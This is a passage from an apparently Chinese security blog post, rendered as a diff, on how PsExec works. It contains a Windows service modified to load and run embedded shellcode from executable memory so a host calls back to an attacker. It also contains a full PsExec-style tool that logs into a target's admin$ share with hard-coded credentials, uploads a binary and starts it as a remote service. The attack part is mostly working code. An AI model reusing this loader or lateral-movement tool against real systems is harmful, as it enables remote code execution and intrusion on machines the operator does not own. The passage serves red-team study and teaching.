+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    }
+    <span style="color:#75715e">/*向SCM 报告运行状态*/</span>
+    ServiceStatus.dwCurrentState <span style="color:#f92672">=</span>
+        SERVICE_RUNNING;
+    SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+
+    <span style="color:#75715e">/*do something you want to do in this while loop*/</span>
+    MEMORYSTATUS memstatus;
+    <span style="color:#66d9ef">while</span> (ServiceStatus.dwCurrentState <span style="color:#f92672">==</span>
+        SERVICE_RUNNING)
+    {
+        <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">16</span>];
+        GlobalMemoryStatus(<span style="color:#f92672">&amp;</span>memstatus);
+        <span style="color:#66d9ef">int</span> availmb <span style="color:#f92672">=</span> memstatus.dwAvailPhys <span style="color:#f92672">/</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">1024</span>;
+        sprintf_s(buffer, <span style="color:#ae81ff">100</span>, <span style="color:#e6db74">&#34;available memory is %dMB&#34;</span>, availmb);
+        <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> WriteToLog(buffer);
+        <span style="color:#66d9ef">if</span> (result)
+        {
+            ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+            ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+            SetServiceStatus(hStatus,
+                <span style="color:#f92672">&amp;</span>ServiceStatus);
+            <span style="color:#66d9ef">return</span>;
+        }
+        Sleep(SLEEP_TIME);
+    }
+    WriteToLog(<span style="color:#e6db74">&#34;service stopped&#34;</span>);
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>源代码：<a href="https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp">https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp</a></p>
+<p>创建一个控制台应用程序，将源代码编译后就可以创建服务了，该服务会每隔5秒向<code>D:\log.txt</code></p>
+<p>写入信息。这里如果展开讲会花费不少时间，我直接把<code>SERVICE_RUNNING</code> 状态下的代码进行更改，使其执行Shellcode上线。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">// Windows 服务代码模板
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">// sc create Monitor binpath= Monitor.exe
+</span><span style="color:#75715e">// sc start Monitor
+</span><span style="color:#75715e">// sc delete Monitor
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span><span style="color:#75715e">/**********************************************************************************/</span>
+<span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">// New-Service –Name Monitor –DisplayName Monitor –BinaryPathName &#34;D:\Monitor\Monitor.exe&#34; –StartupType Automatic
+</span><span style="color:#75715e">// Start-Service Monitor
+</span><span style="color:#75715e">// Stop-Service Monitor
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#75715e">// ..............
+</span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span style="color:#e6db74">&#34;</span>;
+
+SERVICE_STATUS ServiceStatus;  <span style="color:#75715e">/*服务状态*/</span>
+SERVICE_STATUS_HANDLE hStatus; <span style="color:#75715e">/*服务状态句柄*/</span>
+
+<span style="color:#66d9ef">void</span>  <span style="color:#a6e22e">ServiceMain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv);
+<span style="color:#66d9ef">void</span>  <span style="color:#a6e22e">CtrlHandler</span>(DWORD request);
+<span style="color:#66d9ef">int</span>   <span style="color:#a6e22e">InitService</span>();
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, CHAR<span style="color:#f92672">*</span> argv[])
+{
+    WCHAR WserviceName[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;Monitor&#34;</span>);
+    SERVICE_TABLE_ENTRY ServiceTable[<span style="color:#ae81ff">2</span>];
+    ServiceTable[<span style="color:#ae81ff">0</span>].lpServiceName <span style="color:#f92672">=</span> WserviceName;
+    ServiceTable[<span style="color:#ae81ff">0</span>].lpServiceProc <span style="color:#f92672">=</span> (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+    ServiceTable[<span style="color:#ae81ff">1</span>].lpServiceName <span style="color:#f92672">=</span> NULL;
+    ServiceTable[<span style="color:#ae81ff">1</span>].lpServiceProc <span style="color:#f92672">=</span> NULL;
+    StartServiceCtrlDispatcher(ServiceTable);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/*Service initialization*/</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InitService</span>()
+{
+    <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">0</span>);
+}
+
+<span style="color:#75715e">/*Control Handler*/</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">CtrlHandler</span>(DWORD request)
+{
+    <span style="color:#66d9ef">switch</span> (request)
+    {
+    <span style="color:#66d9ef">case</span> SERVICE_CONTROL_STOP:
+
+        
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    <span style="color:#66d9ef">case</span> SERVICE_CONTROL_SHUTDOWN:
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">break</span>;
+    }
+    <span style="color:#75715e">/* Report current status  */</span>
+    SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ServiceMain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
+{
+    WCHAR WserviceName[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;Monitor&#34;</span>);
+    <span style="color:#66d9ef">int</span> error;
+    ServiceStatus.dwServiceType <span style="color:#f92672">=</span>
+        SERVICE_WIN32;
+    ServiceStatus.dwCurrentState <span style="color:#f92672">=</span>
+        SERVICE_START_PENDING;
+    <span style="color:#75715e">/*在本例中只接受系统关机和停止服务两种控制命令*/</span>
+    ServiceStatus.dwControlsAccepted <span style="color:#f92672">=</span>
+        SERVICE_ACCEPT_SHUTDOWN <span style="color:#f92672">|</span>
+        SERVICE_ACCEPT_STOP;
+    ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwServiceSpecificExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwCheckPoint <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwWaitHint <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    hStatus <span style="color:#f92672">=</span> <span style="color:#f92672">::</span>RegisterServiceCtrlHandler(
+        WserviceName,
+        (LPHANDLER_FUNCTION)CtrlHandler);
+    <span style="color:#66d9ef">if</span> (hStatus <span style="color:#f92672">==</span> (SERVICE_STATUS_HANDLE)<span style="color:#ae81ff">0</span>)
+    {
+        <span style="color:#66d9ef">return</span>;
+    }
+    <span style="color:#75715e">/* Initialize Service   */</span>
+    error <span style="color:#f92672">=</span> InitService();
+    <span style="color:#66d9ef">if</span> (error)
+    {
+        <span style="color:#75715e">/* Initialization failed  */</span>
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#75715e">// 在这里执行Shellcode
+</span><span style="color:#75715e"></span>    LPVOID Memory <span style="color:#f92672">=</span> VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(buf), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+    ((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())Memory)();
+
+    <span style="color:#75715e">/*向SCM 报告运行状态*/</span>
+    ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_RUNNING;
+    SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+
+    <span style="color:#75715e">/*do something you want to do in this while loop*/</span>
+    MEMORYSTATUS memstatus;
+    <span style="color:#66d9ef">while</span> (ServiceStatus.dwCurrentState <span style="color:#f92672">==</span> SERVICE_RUNNING)
+    {
+        Sleep(<span style="color:#ae81ff">5000</span>);
+    }
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><h2 id="0x06-使用windows-api远程管理服务">0x06 使用Windows API远程管理服务</h2>
+<p>前面说到，Windows的服务都由服务控制管理器（SCM：<code>Services Control Manager</code>）进行管理，我们可以通过Windows API去连接SCM，当服务程序上传到服务器上以后，创建一个服务，把<code>binpath</code>指向服务程序的路径，再对服务进行启动就可以达到任意代码执行的效果。</p>
+<p>注意：远程连接SCM还是走的SMB协议 445端口，SMB V2可以明显看到流量内容。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">SC_HANDLE <span style="color:#a6e22e">OpenSCManagerA</span>(
+  LPCSTR lpMachineName, <span style="color:#75715e">// 目标计算机的名称。
+</span><span style="color:#75715e"></span>  LPCSTR lpDatabaseName, <span style="color:#75715e">// 服务控制管理器数据库的名称
+</span><span style="color:#75715e"></span>  DWORD  dwDesiredAccess <span style="color:#75715e">// 访问权限列表
+</span><span style="color:#75715e"></span>);
+</code></pre></div><p>如果当前用户在连接到另一台计算机上的服务时没有适当的访问权限，则 <code>OpenSCManager</code>函数调用将失败。若要远程连接到服务，请在调用<code>OpenSCManager</code>之前使用LOGON32_LOGON_NEW_CREDENTIALS 调用<code>LogonUser</code>函数，然后调用<code>ImpersonateLoggedOnUser</code>。</p>
+<p>这里需要注意的是，通过<code>WNetAddConnection2</code>认证后，再去调用OpenSCManager是不需要认证的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">CreateServiceWithSCM</span>(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)
+{
+    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> TEXT(<span style="color:#e6db74">&#34;Will Create Service &#34;</span>) <span style="color:#f92672">&lt;&lt;</span> lpwsServiceName <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    SC_HANDLE hSCM;
+    SC_HANDLE hService;
+    SERVICE_STATUS ss;
+    <span style="color:#75715e">// GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
+</span><span style="color:#75715e"></span>    hSCM <span style="color:#f92672">=</span> OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
+    <span style="color:#66d9ef">if</span> (hSCM <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenSCManager Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    
+    hService <span style="color:#f92672">=</span> CreateService(
+        hSCM, <span style="color:#75715e">// 服务控制管理器数据库的句柄
+</span><span style="color:#75715e"></span>        lpwsServiceName, <span style="color:#75715e">// 要安装的服务的名称
+</span><span style="color:#75715e"></span>        lpwsServiceName, <span style="color:#75715e">// 用户界面程序用来标识服务的显示名称
+</span><span style="color:#75715e"></span>        GENERIC_ALL, <span style="color:#75715e">// 访问权限
+</span><span style="color:#75715e"></span>        SERVICE_WIN32_OWN_PROCESS, <span style="color:#75715e">// 与一个或多个其他服务共享一个流程的服务
+</span><span style="color:#75715e"></span>        SERVICE_DEMAND_START, <span style="color:#75715e">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。
+</span><span style="color:#75715e"></span>        SERVICE_ERROR_IGNORE, <span style="color:#75715e">// 启动程序将忽略该错误并继续启动操作
+</span><span style="color:#75715e"></span>        lpwsServicePath, <span style="color:#75715e">// 服务二进制文件的标准路径
+</span><span style="color:#75715e"></span>        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL);
+    <span style="color:#66d9ef">if</span> (hService <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;CreateService Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> TEXT(<span style="color:#e6db74">&#34;Create Service Success : &#34;</span>) <span style="color:#f92672">&lt;&lt;</span> lpwsServicePath <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    hService <span style="color:#f92672">=</span> OpenService(hSCM, lpwsServiceName, GENERIC_ALL);
+    <span style="color:#66d9ef">if</span> (hService <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenService Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenService Success!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    
+    StartService(hService, NULL, NULL);
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>获得SCM句柄后调用<code>CreateService</code> 创建一个服务，最终调用<code>StartService</code> 完成整个服务的创建、启动过程。</p>
+<p>效果如下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9871cbc207bd2e26d2613428ec94c46e.png" alt="2020-04-01-14-39-18"></p>
+<p>至此，整个Psexec工具原理分析与实践完成。</p>
+<h2 id="0x07-psexec完整代码">0x07 PsExec完整代码</h2>
+<p>代码我上传到了Github：<a href="https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp">https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">// Psexec.cpp : 此文件包含 &#34;main&#34; 函数。程序执行将在此处开始并结束。
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winnetwk.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib, &#34;ws2_32&#34;)   
+</span><span style="color:#75715e">#pragma comment(lib, &#34;Mpr.lib&#34;)
+</span><span style="color:#75715e">#pragma comment(lib,&#34;Advapi32.lib&#34;)
+</span><span style="color:#75715e"></span>
+DWORD <span style="color:#a6e22e">ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUser, LPCWSTR lpwsPassword);
+BOOL <span style="color:#a6e22e">UploadFileBySMB</span>(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath);
+BOOL <span style="color:#a6e22e">CreateServiceWithSCM</span>(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath);
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> argv[])
+{
+    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[ PS|&gt; :) Hello PsExec By Rvn0xsy !&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+
+    LPCWSTR lpwsHost <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;192.168.3.130&#34;</span>); <span style="color:#75715e">// 目标机器地址
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsUserName <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;Administrator&#34;</span>); <span style="color:#75715e">// 账号
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsPassword <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;123456&#34;</span>); <span style="color:#75715e">// 密码
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsSrcPath <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Administrator</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">NewPsexec.exe&#34;</span>); <span style="color:#75715e">// 本地文件路径
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsDstPath <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">192.168.3.130</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin$</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">NewPsexec.exe&#34;</span>); <span style="color:#75715e">// 远程文件路径
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsServiceName <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;NewPsexec&#34;</span>); <span style="color:#75715e">// 服务名称
+</span><span style="color:#75715e"></span>    LPCWSTR lpwsServicePath <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;%SystemRoot%</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">NewPsexec.exe&#34;</span>); <span style="color:#75715e">// 目标机器落地位置
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        BOOL bRetVal <span style="color:#f92672">=</span> FALSE;
+        bRetVal<span style="color:#f92672">=</span>UploadFileBySMB(lpwsSrcPath, lpwsDstPath);
+        <span style="color:#66d9ef">if</span> (bRetVal) {
+            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Upload Success !&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+            <span style="color:#75715e">// 如果上传成功即可创建服务
+</span><span style="color:#75715e"></span>            CreateServiceWithSCM(lpwsHost, lpwsServiceName, lpwsServicePath);
+        }
+        <span style="color:#66d9ef">else</span> {
+            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Upload Failed ! Error : &#34;</span><span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+            <span style="color:#66d9ef">return</span> GetLastError();
+        }
+    }
+}
+
+DWORD <span style="color:#a6e22e">ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
+{
+    <span style="color:#75715e">// 用于存放SMB共享资源格式
+</span><span style="color:#75715e"></span>    PWCHAR lpwsIPC <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> WCHAR[MAX_PATH]; 
+    DWORD dwRetVal; <span style="color:#75715e">// 函数返回值
+</span><span style="color:#75715e"></span>    NETRESOURCE nr; <span style="color:#75715e">// 连接的详细信息
+</span><span style="color:#75715e"></span>    DWORD dwFlags; <span style="color:#75715e">// 连接选项
+</span><span style="color:#75715e"></span>
+    ZeroMemory(<span style="color:#f92672">&amp;</span>nr, <span style="color:#66d9ef">sizeof</span>(NETRESOURCE));
+    swprintf(lpwsIPC, MAX_PATH,TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin$&#34;</span>), lpwsHost);
+    nr.dwType <span style="color:#f92672">=</span> RESOURCETYPE_ANY; <span style="color:#75715e">// 枚举所有资源
+</span><span style="color:#75715e"></span>    nr.lpLocalName <span style="color:#f92672">=</span> NULL;
+    nr.lpRemoteName <span style="color:#f92672">=</span> lpwsIPC; <span style="color:#75715e">// 资源的网络名
+</span><span style="color:#75715e"></span>    nr.lpProvider <span style="color:#f92672">=</span> NULL; 
+
+    <span style="color:#75715e">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。
+</span><span style="color:#75715e"></span>    dwFlags <span style="color:#f92672">=</span> CONNECT_UPDATE_PROFILE; 
+
+    dwRetVal <span style="color:#f92672">=</span> WNetAddConnection2(<span style="color:#f92672">&amp;</span>nr,lpwsPassword, lpwsUserName, dwFlags);
+    <span style="color:#66d9ef">if</span> (dwRetVal <span style="color:#f92672">==</span> NO_ERROR) {
+        <span style="color:#75715e">// 返回NO_ERROR则成功
+</span><span style="color:#75715e"></span>        wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Connection added to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nr.lpRemoteName);
+        <span style="color:#66d9ef">return</span> dwRetVal;
+    }
+    
+    wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;WNetAddConnection2 failed with error: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwRetVal);
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+}
+
+BOOL <span style="color:#a6e22e">UploadFileBySMB</span>(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)
+{
+    DWORD dwRetVal;
+    dwRetVal <span style="color:#f92672">=</span> CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);
+    <span style="color:#66d9ef">return</span> dwRetVal <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> TRUE : FALSE;
+}
+
+BOOL <span style="color:#a6e22e">CreateServiceWithSCM</span>(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)
+{
+    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> TEXT(<span style="color:#e6db74">&#34;Will Create Service &#34;</span>) <span style="color:#f92672">&lt;&lt;</span> lpwsServiceName <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    SC_HANDLE hSCM;
+    SC_HANDLE hService;
+    SERVICE_STATUS ss;
+    <span style="color:#75715e">// GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
+</span><span style="color:#75715e"></span>    hSCM <span style="color:#f92672">=</span> OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
+    <span style="color:#66d9ef">if</span> (hSCM <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenSCManager Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    
+    hService <span style="color:#f92672">=</span> CreateService(
+        hSCM, <span style="color:#75715e">// 服务控制管理器数据库的句柄
+</span><span style="color:#75715e"></span>        lpwsServiceName, <span style="color:#75715e">// 要安装的服务的名称
+</span><span style="color:#75715e"></span>        lpwsServiceName, <span style="color:#75715e">// 用户界面程序用来标识服务的显示名称
+</span><span style="color:#75715e"></span>        GENERIC_ALL, <span style="color:#75715e">// 访问权限
+</span><span style="color:#75715e"></span>        SERVICE_WIN32_OWN_PROCESS, <span style="color:#75715e">// 与一个或多个其他服务共享一个流程的服务
+</span><span style="color:#75715e"></span>        SERVICE_DEMAND_START, <span style="color:#75715e">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。
+</span><span style="color:#75715e"></span>        SERVICE_ERROR_IGNORE, <span style="color:#75715e">// 启动程序将忽略该错误并继续启动操作
+</span><span style="color:#75715e"></span>        lpwsServicePath, <span style="color:#75715e">// 服务二进制文件的标准路径
+</span><span style="color:#75715e"></span>        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL);
+    <span style="color:#66d9ef">if</span> (hService <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;CreateService Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> TEXT(<span style="color:#e6db74">&#34;Create Service Success : &#34;</span>) <span style="color:#f92672">&lt;&lt;</span> lpwsServicePath <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    hService <span style="color:#f92672">=</span> OpenService(hSCM, lpwsServiceName, GENERIC_ALL);
+    <span style="color:#66d9ef">if</span> (hService <span style="color:#f92672">==</span> NULL) {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenService Error: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
